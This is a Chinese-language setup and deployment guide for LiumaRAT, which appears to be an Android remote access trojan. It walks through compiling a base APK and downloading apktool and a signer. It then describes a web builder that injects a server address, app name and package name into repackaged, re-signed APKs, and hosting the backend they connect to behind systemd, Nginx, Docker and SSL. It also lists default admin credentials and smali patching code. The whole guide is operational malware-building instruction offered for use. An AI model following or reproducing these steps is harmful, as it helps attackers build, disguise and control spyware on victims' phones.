# LiumaRAT APK 构建系统快速启动指南

## 5 分钟快速开始

### 前提条件

- Linux/macOS/WSL 环境
- Git 已安装
- Node.js 18+
- Java 17+

### 步骤 1: 克隆项目

```bash
git clone https://github.com/xiang20041021/LiumaRAT.git
cd LiumaRAT
```

### 步骤 2: 准备 APK 构建环境

```bash
# 创建 factory 目录
mkdir -p backend/app/factory/baseApp

# 从 Android 项目编译基础 APK
cd LIUMA
chmod +x gradlew
./gradlew assembleDebug

# 复制到 factory 目录
cp app/build/outputs/apk/debug/app-debug.apk ../backend/app/factory/baseApp/Liuma.apk
cd ..

# 下载 apktool
cd backend/app/factory
wget https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar -O apktool.jar

# 下载签名工具
wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O uber-apk-signer.jar

cd ../..
```

### 步骤 3: 安装依赖和启动

```bash
# 安装依赖
npm install

# 启动开发服务器
npm run dev
```

**输出应该显示:**
```
[1]   VITE v5.4.21  ready in XXX ms
[1]   ➜  Local:   http://localhost:5173/
[0] 亚太科技 Backend running on http://0.0.0.0:32766
```

### 步骤 4: 访问 Builder

打开浏览器访问:
```
http://localhost:5173/builder
```

### 步骤 5: 构建你的第一个 APK

1. 登录 (默认: admin / s20041021)
2. 导航到 Builder 页面
3. 填写配置:
   - 服务器地址: `http://127.0.0.1:32766`
   - 主页: `https://google.com`
   - 应用名称: `MyApp`
   - 包名: `com.example.myapp`
   - 版本号: `1.0.0`
4. 点击"构建 APK"
5. 等待完成，点击"下载 APK"

### 故障排除

```bash
# 如果构建失败，检查日志
# 后端日志会显示具体错误

# 验证环境
java -version          # 应该是 Java 17+
ls backend/app/factory/  # 应该看到 apktool.jar, uber-apk-signer.jar
ls backend/app/factory/baseApp/  # 应该看到 Liuma.apk
```

---

## 生产部署指南

### 1. 服务器环境准备

```bash
# 更新系统
sudo apt-get update && sudo apt-get upgrade -y

# 安装 Node.js
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# 安装 Java 17
sudo apt-get install -y openjdk-17-jdk

# 验证
node -v  # v20.x.x
java -version  # openjdk version "17.x.x"
```

### 2. 克隆项目

```bash
cd /opt
sudo git clone https://github.com/xiang20041021/LiumaRAT.git
cd LiumaRAT
sudo chown -R $USER:$USER /opt/LiumaRAT
```

### 3. 准备 APK 工具链

```bash
# 编译基础 APK
cd LIUMA
export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64
./gradlew assembleDebug
cp app/build/outputs/apk/debug/app-debug.apk ../backend/app/factory/baseApp/Liuma.apk

# 下载工具
cd ../backend/app/factory
wget https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar -O apktool.jar
wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O uber-apk-signer.jar

cd /opt/LiumaRAT
```

### 4. 构建项目

```bash
npm install
npm run build
```

### 5. 配置 Systemd 服务

创建 `/etc/systemd/system/liumarat.service`:

```ini
[Unit]
Description=LiumaRAT Backend Service
After=network.target

[Service]
Type=simple
User=liumarat
WorkingDirectory=/opt/LiumaRAT
Environment="NODE_ENV=production"
Environment="PORT=32766"
ExecStart=/usr/bin/npm start
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

启用服务:

```bash
sudo systemctl daemon-reload
sudo systemctl enable liumarat
sudo systemctl start liumarat
```

检查状态:

```bash
sudo systemctl status liumarat
sudo journalctl -u liumarat -f  # 查看实时日志
```

### 6. Nginx 反向代理

创建 `/etc/nginx/sites-available/liumarat`:

```nginx
server {
    listen 80;
    server_name your-domain.com;
    
    client_max_body_size 100M;
    proxy_read_timeout 300s;
    proxy_connect_timeout 300s;

    # WebSocket 支持
    map $http_upgrade $connection_upgrade {
        default upgrade;
        '' close;
    }

    location / {
        proxy_pass http://127.0.0.1:32766;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

启用:

```bash
sudo ln -s /etc/nginx/sites-available/liumarat /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl restart nginx
```

### 7. SSL 证书 (可选)

```bash
sudo apt-get install -y certbot python3-certbot-nginx
sudo certbot --nginx -d your-domain.com
```

### 8. 备份和维护

```bash
# 定期备份数据库
sudo crontab -e
# 添加: 0 2 * * * /usr/bin/tar -czf /backup/liumarat-$(date +\%Y\%m\%d).tar.gz /opt/LiumaRAT/data/

# 检查磁盘使用
du -sh /opt/LiumaRAT/data/
sqlite3 /opt/LiumaRAT/data/liumaRat.db "SELECT SUM(fileSize)/1024/1024/1024 as size_gb FROM build_records;"
```

---

## Docker 部署 (可选)

创建 `Dockerfile`:

```dockerfile
FROM node:20-alpine

RUN apk add --no-cache \
    openjdk17-jdk \
    curl \
    wget \
    git

WORKDIR /app

COPY package*.json ./
RUN npm install

COPY . .

RUN npm run build:backend

EXPOSE 32766 5173

CMD ["npm", "start"]
```

构建和运行:

```bash
docker build -t liumarat:latest .
docker run -p 32766:32766 -p 5173:5173 \
  -v /opt/liumarat/data:/app/data \
  -v /opt/liumarat/app/factory:/app/backend/app/factory \
  liumarat:latest
```

---

## 生产环境检查清单

- [ ] Java 17+ 已安装
- [ ] Node.js 18+ 已安装
- [ ] 基础 APK 已放置在 `backend/app/factory/baseApp/Liuma.apk`
- [ ] apktool.jar 已下载到 `backend/app/factory/`
- [ ] uber-apk-signer.jar 已下载到 `backend/app/factory/`
- [ ] npm install 已执行
- [ ] npm run build 已成功
- [ ] 数据库已初始化
- [ ] Systemd 服务已配置 (如使用 Linux)
- [ ] Nginx 反向代理已配置 (如使用)
- [ ] SSL 证书已安装 (生产环境)
- [ ] 防火墙已开放必要端口 (32766, 80, 443)
- [ ] 备份策略已制定

---

## 常见问题

### Q: 如何更换基础 APK?

A: 替换 `backend/app/factory/baseApp/Liuma.apk` 文件，重启服务：

```bash
sudo systemctl restart liumarat
```

### Q: APK 构建失败，如何调试?

A: 查看后端日志：

```bash
# 开发环境
npm run dev:backend

# 生产环境
sudo journalctl -u liumarat -f
```

搜索包含 "Build failed" 的日志行。

### Q: 如何清空历史构建记录?

A: 使用 SQLite 查询：

```bash
sqlite3 /opt/LiumaRAT/data/liumaRat.db
> DELETE FROM build_records;
```

### Q: 构建速度太慢

A: 几个步骤耗时较长：
- 反编译 (10-15 秒)：apktool 的限制
- 重建 (15-20 秒)：编译资源的时间
- 签名 (1-2 秒)：快速

总时间通常 30-40 秒。

### Q: 如何限制 APK 构建的并发数?

A: 当前只支持单个构建，后续可修改为支持队列。修改 `buildState` 为队列模式：

```typescript
// backend/src/routes/builder.ts
const buildQueue: BuildRequest[] = [];
const maxConcurrent = 2;  // 最多同时 2 个

// 在 POST /builder/build 中加入队列逻辑
buildQueue.push({ /* 构建参数 */ });
processBuildQueue();
```

### Q: 如何添加新的 APK 修补项?

A: 在 `patchApk()` 函数中添加新的 Smali 替换逻辑：

```typescript
// backend/src/routes/builder.ts 行 147
const myCustomFieldPattern = /\.field\s+[^\n]*\bMY_FIELD:Ljava\/lang\/String;[^\n]*=\s*"[^"]*"/g;
if (myCustomFieldPattern.test(content)) {
  content = content.replace(myCustomFieldPattern, (match) => 
    match.replace(/"[^"]*"/, `"${safeCustomValue}"`)
  );
  modified = true;
}
```

---

## 性能优化建议

### 1. 使用 RAM Disk 存放临时构建目录

```bash
sudo mkdir -p /mnt/ramdisk
sudo mount -t tmpfs -o size=10G tmpfs /mnt/ramdisk

# 修改 backend/src/config/paths.ts 中的临时目录路径
```

### 2. 调整数据库清理策略

```typescript
// 只保留最近 10 个构建而不是 4 个
d.run(sql`DELETE FROM build_records WHERE id NOT IN (
  SELECT id FROM build_records ORDER BY id DESC LIMIT 10
)`);
```

### 3. 启用 gzip 压缩

```typescript
// backend 可以使用 @fastify/compress 插件
app.register(require('@fastify/compress'));
```

### 4. 缓存基础 APK 的反编译结果

```typescript
// 如果基础 APK 不变，可缓存反编译结果，减少重复反编译
const cachedDecompile = new Map();
```

---

## 监控和日志

### 启用结构化日志

```typescript
// 使用 pino-pretty 格式化日志
const log = pino({ 
  transport: {
    target: 'pino-pretty',
    options: {
      colorize: true,
      levelFirst: true,
      singleLine: false
    }
  }
});
```

### 关键指标收集

- 构建耗时
- 构建成功率
- APK 文件大小趋势
- 同时在线用户数
- 数据库大小

### 告警规则

```bash
# 当构建失败率 > 10% 时告警
# 当数据库大小 > 10GB 时告警
# 当后端响应时间 > 5s 时告警
```

---

## 更新和维护

### 更新项目代码

```bash
cd /opt/LiumaRAT
git pull origin main
npm install
npm run build
sudo systemctl restart liumarat
```

### 更新依赖

```bash
# 检查过期的依赖
npm outdated

# 安全更新
npm audit fix

# 完整更新
npm update
```

### 备份恢复

```bash
# 备份
tar -czf liumarat-backup-$(date +%Y%m%d).tar.gz data/

# 恢复
tar -xzf liumarat-backup-20260812.tar.gz
```

---

## 许可证

MIT License - 详见 [LICENSE](LICENSE)

---

## 支持

遇到问题？

1. 查阅完整指南: [APK_BUILD_DOWNLOAD_GUIDE.md](APK_BUILD_DOWNLOAD_GUIDE.md)
2. 检查项目 Issues: https://github.com/xiang20041021/LiumaRAT/issues
3. 提交新 Issue 或 Pull Request

